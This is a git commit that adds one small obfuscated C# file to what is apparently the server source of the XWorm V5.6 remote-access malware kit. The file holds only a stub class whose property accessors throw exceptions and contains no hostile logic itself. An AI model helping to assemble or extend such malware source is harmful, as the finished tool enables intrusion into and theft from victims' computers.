705a343d65fd8eac280daa16db93518b96558a5b
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:51:17 +0400

    Forms49.cs

---
+++ XWorm V5.6/Server/Forms/Forms49.cs
@@ -0,0 +1,18 @@
+﻿using System;
+using System.Runtime.CompilerServices;
+
+namespace M2C90B6M0DCE1ECE0C3131393DD66DBB
+{
+  public class M5FB199BD4C193A94563MC8D86C1B119
+  {
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public string get_sName() => throw new Exception("ぱ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_sName(string AutoPropertyValue) => throw new Exception("け");
+  }
+}
